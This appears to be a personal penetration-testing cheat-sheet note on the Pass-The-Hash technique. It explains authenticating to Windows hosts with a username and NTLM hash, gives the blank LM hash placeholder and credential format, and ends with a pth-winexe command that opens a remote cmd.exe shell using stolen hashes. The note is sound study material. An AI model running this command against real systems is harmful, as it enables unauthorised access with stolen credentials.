---
title: Pass-The-Hash
date: M02-05-2023
author: i4
---
PtH was discovered back in 1997 and allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear password.

- This only works for domain accounts and the built-in local administrator account. Since the 2014 [update](https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649) this no longer works for other local admin accounts.

## Requirements
- NTLM/LM hashes
- LM hash is not needed since Windows Vista+ has no use for it anymore
	- Use `aad3b435b51404eeaad3b435b51404ee` for the LM part
- Format: `[User]%aad3b435b51404eeaad3b435b51404ee:[NTLM]`

## pth-winexe
- See [[Mimikatz]] to export credentials from target system
```
pth-winexe -U [USERNAME]%[LM]:[NTLM] //10.0.0.10 cmd.exe
```